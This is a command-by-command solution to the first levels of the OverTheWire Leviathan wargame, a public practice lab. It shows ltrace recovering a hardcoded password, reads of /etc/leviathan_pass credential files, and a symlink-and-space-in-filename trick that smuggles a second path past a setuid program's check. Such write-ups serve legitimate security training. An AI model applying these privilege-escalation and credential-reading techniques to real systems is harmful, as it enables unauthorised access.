# Solution to Leviathan levels
# Leviathan 0 -> 1
ssh leviathan0@leviathan.labs.overthewire.org -p 2223
leviathan0
ls -al
cd .backup # Here we can see that leviathan1 was owner of the directory
ls -al
vim bookmarks.html # HTML is way too big, we'll need to find a specific thing related to leviathan1
cd ..
grep -rnw '/.backup' -e 'leviathan1'
vim /.backup/bookmarks.html # Go to line 1057

# Leviathan 1 -> 2
ssh leviathan1@leviathan.labs.overthewire.org -p 2223
ls -al
file check
./check
ltrace ./check
./check #Password = sex
ls -al
whoami
cat /etc/leviathan_pass/leviathan2

# Leviathan 2 -> 3
ssh leviathan2@leviathan.labs.overthewire.org -p 2223
ls -al
file printfile
./printfile
./printfile /etc/leviathan_pass/leviathan3
ltrace ./printfile
mkdir /tmp/zulu/ && touch /tmp/zulu/file \tmp.txt
cd /tmp/zulu
ltrace ./printfile file
ln -s /etc/leviathan_pass/leviathan3 /tmp/zulu/file
./printfile "file tmp.txt"


 
